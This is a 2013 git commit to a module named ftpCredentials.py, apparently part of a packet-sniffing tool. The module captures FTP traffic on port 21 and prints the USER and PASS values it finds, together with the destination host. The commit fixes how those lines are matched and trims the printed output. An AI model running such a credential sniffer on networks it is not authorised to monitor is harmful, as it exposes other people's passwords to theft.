5995132d0457287ac5c301fddcaf3dbda837c6e4
Ganapati <ganapati@kalkulators.org>
2013-08-03 16:41:33 +0200

    fix terminal output and adjust filtering

--- modules/ftpCredentials.py
+++ modules/ftpCredentials.py
@@ -8,10 +8,10 @@ class module:
     def processPacket(self, packet):
         if packet.payload.dport == 21:
             data = packet.payload.payload.payload.fields["load"]
-            if data.find("USER "):
-                print "[+] FTP user for %s : %s" % (packet.payload.dst, data.replace("USER ", ""))
-            if data.find("PASS "):
-                print "[+] FTP pass for %s : %s" % (packet.payload.dst, data.replace("PASS ", ""))
+            if data.startswith("USER "):
+                print "[+] FTP user for %s : %s" % (packet.payload.dst, data.replace("USER ", "").rstrip())
+            if data.startswith("PASS "):
+                print "[+] FTP pass for %s : %s" % (packet.payload.dst, data.replace("PASS ", "").rstrip())
 
     def getDescription(self):
         return "%s (%s)" % (self.moduleName, self.moduleDescription) 
